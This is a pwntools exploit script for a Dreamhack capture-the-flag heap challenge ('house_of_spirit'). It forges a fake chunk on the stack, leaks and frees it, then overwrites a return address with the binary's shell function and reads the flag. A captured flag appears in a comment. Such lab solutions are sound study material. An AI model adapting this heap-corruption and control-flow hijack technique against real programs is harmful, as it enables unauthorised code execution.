#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'house_of_spirit'
HOST = 'host8.dreamhack.games'
PORT = 21775

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x0000000000401474
b*0x00000000004013b2
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(size, data):
    sla(b'> ', b'1')
    sla(b'Size: ', str(size).encode())
    sa(b'Data: ', data)
def delete(addr):
    sla(b'> ', b'2')
    sla(b'Addr: ', str(addr).encode())

win = exe.sym.get_shell

sa(b'name: ', p64(0) + p64(0x51))
rcu(b'0x')
stack = int(rcu(b':')[:-1], 16)
log.success(f'stack leak: {hex(stack)}')
delete(stack+0x10)

payload = b"A" * 0x28 + p64(win)
create(0x40, payload)
sla(b'> ', b'3')
sl(b'cat flag*')
# DH{d351d8d936884dc4aaebb689e8a183b2}
p.interactive()
